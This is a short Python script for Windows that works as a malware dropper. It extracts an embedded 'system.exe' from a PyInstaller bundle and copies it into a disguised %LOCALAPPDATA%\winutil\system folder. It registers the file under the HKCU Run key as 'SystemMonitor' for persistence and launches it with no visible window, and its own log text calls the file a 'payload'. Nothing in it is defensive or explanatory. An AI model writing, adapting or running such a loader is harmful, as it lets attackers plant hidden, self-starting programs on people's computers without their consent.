import os
import sys
import shutil
import subprocess
import winreg

def get_install_path():
    return os.path.expandvars(r"%LOCALAPPDATA%\winutil\system\system.exe")

def already_installed(path):
    return os.path.exists(path)

def add_to_startup(name, path):
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
        print(f"[+] Added to startup: {name}")
    except Exception as e:
        print(f"[-] Failed to add to startup: {e}")

def get_embedded_file(filename):
    if getattr(sys, 'frozen', False):
        # In --onefile mode, _MEIPASS is the temp folder PyInstaller uses
        return os.path.join(sys._MEIPASS, filename)
    return os.path.join(os.path.dirname(__file__), filename)

def install_and_run():
    target = get_install_path()
    source = get_embedded_file("system.exe")

    if not os.path.exists(source):
        print(f"[-] Embedded system.exe not found.")
        return

    if already_installed(target):
        print("[*] Already installed. Launching...")
    else:
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True)
            shutil.copy2(source, target)
            print(f"[+] Installed system.exe to: {target}")
            add_to_startup("SystemMonitor", target)
        except Exception as e:
            print(f"[-] Installation failed: {e}")
            return

    try:
        subprocess.Popen([target], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        print("[+] Executed installed payload.")
    except Exception as e:
        print(f"[-] Failed to execute: {e}")

if __name__ == "__main__":
    install_and_run()
